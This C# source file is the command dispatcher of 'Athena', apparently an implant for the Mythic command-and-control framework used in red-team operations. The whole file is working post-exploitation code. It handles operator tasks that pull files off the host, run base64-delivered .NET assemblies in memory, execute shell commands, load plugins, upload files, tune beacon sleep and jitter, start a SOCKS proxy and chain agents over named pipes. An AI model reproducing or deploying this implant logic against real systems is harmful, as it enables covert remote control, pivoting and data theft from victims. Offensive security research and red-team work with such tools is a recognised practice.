using Athena.Commands.Model;
using Athena.Models.Athena.Assembly;
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands
{

    public class CommandHandler
    {
        static string executeAssemblyTask = "";
        
        /// <summary>
        /// Kick off a MythicJob
        /// </summary>
        /// <param name="job">MythicJob containing execution parameters</param>
        public static async void StartJob(MythicJob job)
        {
            switch (job.task.command)
            {
                case "download":
                    if (!Globals.downloadJobs.ContainsKey(job.task.id))
                    {
                        MythicDownloadJob downloadJob = new MythicDownloadJob(job);
                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                        downloadJob.path = par["File"].Replace("\"", "");
                        downloadJob.total_chunks = downloadJob.GetTotalChunks();

                        Globals.downloadJobs.Add(job.task.id, downloadJob);

                        if (downloadJob.total_chunks == 0)
                        {
                            job.errored = true;
                            job.taskresult = "An error occurred while attempting to access the file.";
                            job.hasoutput = true;
                            job.complete = true;
                        }

                        //Download response ready to return
                        job.started = true;
                        job.taskresult = "";
                        job.hasoutput = true;
                    }
                    break;
                case "execute-assembly":
                    if (executeAssemblyTask != "")
                    {
                        completeJob(ref job, "Failed to load assembly. Another assembly is already executing.", true);
                    }
                    else
                    {
                        var t = Task.Run(() =>
                        {
                            job.cancellationtokensource.Token.ThrowIfCancellationRequested();
                            executeAssemblyTask = job.task.id;
                            ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                            job.taskresult = "";
                            job.hasoutput = true;

                            using (var consoleWriter = new ConsoleWriter())
                            {
                                var origStdout = Console.Out;
                                try
                                {
                                    consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
                                    //Set output for our ConsoleWriter
                                    Console.SetOut(consoleWriter);
                                    //Start a new thread for our blocking Execute-Assembly
                                    try
                                    {
                                        job.hasoutput = true;
                                        AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);

                                        //Assembly finished executing.
                                        executeAssemblyTask = "";
                                        job.complete = true;
                                        Console.SetOut(origStdout);
                                        return;
                                    }
                                    catch (Exception)
                                    {
                                        //Cancellation was requested, clean up.
                                        executeAssemblyTask = "";
                                        completeJob(ref job, "", true);
                                        Console.SetOut(origStdout);
                                        Globals.alc.Unload();
                                        Globals.alc = new ExecuteAssemblyContext();
                                        return;
                                    }
                                }
                                catch (Exception e)
                                {
                                    executeAssemblyTask = "";
                                    completeJob(ref job, e.Message, true);
                                    Console.SetOut(origStdout);
                                }
                            }
                        }, job.cancellationtokensource.Token);
                    }
                    break;
                case "exit":
                    Environment.Exit(0);
                    break;
                case "jobs":
                    string output = "[";
                    foreach (var j in Globals.jobs)
                    {
                        output += $"{{\"id\":\"{j.Value.task.id}\",";
                        output += $"\"command\":\"{j.Value.task.command}\",";
                        if (j.Value.started & !j.Value.complete)
                        {
                            output += $"\"status\":\"Started\"}},";
                        }
                        else if (j.Value.complete)
                        {
                            output += $"\"status\":\"Completed\"}},";
                        }
                        else
                        {
                            output += $"\"status\":\"Not Started\"}},";
                        }
                    }
                    output = output.TrimEnd(',') + "]";
                    completeJob(ref job, output, false);
                    break;
                case "jobkill":
                    MythicJob jobToKill = Globals.jobs.FirstOrDefault(x => x.Value.task.id == x.Value.task.parameters).Value;
                    if (jobToKill is not null)
                    {
                        //Attempt the cancel.
                        jobToKill.cancellationtokensource.Cancel();

                        //Wait to see if the cancel took.
                        for (int i = 0; i != 31; i++)
                        {
                            //Job exited successfully
                            if (jobToKill.complete)
                            {
                                completeJob(ref jobToKill, $"Task {jobToKill.task.parameters} exited successfully.", false);
                                break;
                            }
                            //Job may have failed to cancel
                            if (i == 30 && !jobToKill.complete)
                            {
                                completeJob(ref jobToKill, $"Unable to cancel Task: {jobToKill.task.parameters}. Request timed out.", true);
                            }

                            //Wait 1s, This will be 30s once all the loops complete.
                            await Task.Delay(1000);
                        }
                    }
                    else
                    {
                        completeJob(ref job, $"Task {job.task.parameters} not found!", true);
                    }
                    break;
                case "link":
                    {
                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                        if (par.ContainsKey("hostname") && par.ContainsKey("pipename"))
                        {
                            if (Globals.mc.MythicConfig.forwarder.Link(par["hostname"], par["pipename"]).Result)
                            {
                                completeJob(ref job, "Link established.", false);
                            }
                            else
                            {
                                if (Globals.mc.MythicConfig.forwarder.connected)
                                {
                                    completeJob(ref job, "A connection has already been established with an Athena agent.", true);
                                }
                                else
                                {
                                    completeJob(ref job, "An error occured while establishing a link :(", true);
                                }
                            }
                        }
                        else
                        {
                            completeJob(ref job, "Invalid command line parameters.", true);
                        }

                    }
                    break;
                case "load":
                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                    completeJob(ref job, AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.command), false);
                    break;
                //Can these all be merged into one and handled on the server-side?
                case "load-assembly":
                    try
                    {
                        LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                        completeJob(ref job, AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly)), false);
                    }
                    catch (Exception e)
                    {
                        completeJob(ref job, e.Message, true);
                    }
                    break;
                case "reset-assembly-context":
                    completeJob(ref job, AssemblyHandler.ClearAssemblyLoadContext(), false);
                    break;
                case "shell":
                    Execution.ShellExec(job);
                    break;
                case "sleep":
                    var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                    if (sleepInfo.ContainsKey("sleep"))
                    {
                        try
                        {
                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["sleep"].ToString());
                        }
                        catch (Exception e)
                        {
                            Misc.WriteError(e.Message);
                            job.taskresult += "Invalid sleeptime specified." + Environment.NewLine;
                            job.errored = true;
                        }
                    }
                    if (sleepInfo.ContainsKey("jitter"))
                    {
                        try
                        {
                            Globals.mc.MythicConfig.jitter = int.Parse(sleepInfo["jitter"].ToString());
                        }
                        catch (Exception e)
                        {
                            Misc.WriteError(e.Message);
                            job.taskresult += "Invalid jitter specified." + Environment.NewLine;
                            job.errored = true;
                        }
                    }
                    if (!job.errored)
                    {
                        completeJob(ref job, "Sleep updated successfully.", false);
                    }
                    else
                    {
                        completeJob(ref job, job.taskresult, true);
                    }
                    break;
                case "socks":
                    var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                    if (socksInfo["action"].ToString() == "start")
                    {
                        if (Globals.socksHandler is null)
                        {
                            Globals.socksHandler = new SocksHandler();
                            await Globals.socksHandler.Start();
                        }
                        else
                        {
                            if (Globals.socksHandler.running)
                            {
                                completeJob(ref job, "SocksHandler is already running.", true);
                            }
                            else
                            {
                                await Globals.socksHandler.Start();
                                completeJob(ref job, "Socks started.", false);
                            }
                        }
                    }
                    else
                    {
                        try
                        {
                            if (Globals.socksHandler is not null)
                            {
                                Globals.socksHandler.Stop();
                                completeJob(ref job, "Socks stopped.", false);
                            }
                            else
                            {
                                completeJob(ref job, "Socks is not running.", true);
                            }
                        }
                        catch (Exception e)
                        {
                            Misc.WriteError(e.Message);
                            completeJob(ref job, "Socks is not running.", true);
                        }
                    }
                    break;
                case "stop-assembly":
                    completeJob(ref job, "This function does not work properly yet.", true);
                    break;
                case "unlink":
                    if (Globals.socksHandler.running)
                    {
                        Globals.socksHandler.Stop();
                        completeJob(ref job, "Unlinked from agent.", false);
                    }
                    else
                    {
                        completeJob(ref job, "No agent currently connected.", true);
                    }
                    break;
                case "upload":
                    try
                    {
                        if (!Globals.uploadJobs.ContainsKey(job.task.id))
                        {
                            MythicUploadJob uj = new MythicUploadJob(job);
                            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                            uj.path = par["remote_path"];
                            uj.file_id = par["file"];
                            uj.task = job.task;
                            uj.chunk_num = 1;
                            job.started = true;
                            job.hasoutput = true;
                            job.taskresult = "";

                            //Add job to job tracking Dictionary
                            Globals.uploadJobs.Add(uj.task.id, uj);
                        }
                    }
                    catch (Exception e)
                    {
                        Misc.WriteError(e.Message);
                        completeJob(ref job, e.Message, true);
                    }
                    break;
                default:
                    checkAndRunPlugin(job);
                    break;
            }
        }
        
        static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
        {
            try
            {
                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == executeAssemblyTask).Value;
                job.taskresult += e.Value + Environment.NewLine;
                job.hasoutput = true;
            }
            catch (Exception f)
            {
                Misc.WriteError(f.Message);
                //Fail silently
            }
        }

        /// <summary>
        /// Determine if a Mythic command is loaded, if it is, run it
        /// </summary>
        /// <param name="job">MythicJob containing execution parameters</param>
        static void checkAndRunPlugin(MythicJob job)
        {
            if (Globals.loadedcommands.ContainsKey(job.task.command))
            {
                PluginResponse pr = AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                completeJob(ref job, pr.output, !pr.success);
            }
            else
            {
                completeJob(ref job, "Plugin not loaded. Please use the load command to load the plugin!", true);
            }
        }

        /// <summary>
        /// Complete a MythicJob
        /// </summary>
        /// <param name="job">MythicJob containing execution parameters</param>
        /// <param name="output">Output to return as a mythic task</param>
        /// <param name="error">Boolean indicating whether the task errored or not</param>
        private static void completeJob(ref MythicJob job, string output, bool error)
        {
            job.taskresult = output;
            job.complete = true;
            job.errored = error;
            if (!String.IsNullOrEmpty(output))
            {
                job.hasoutput = true;
            }
            else
            {
                job.hasoutput = false;
            }
        }
    }
}
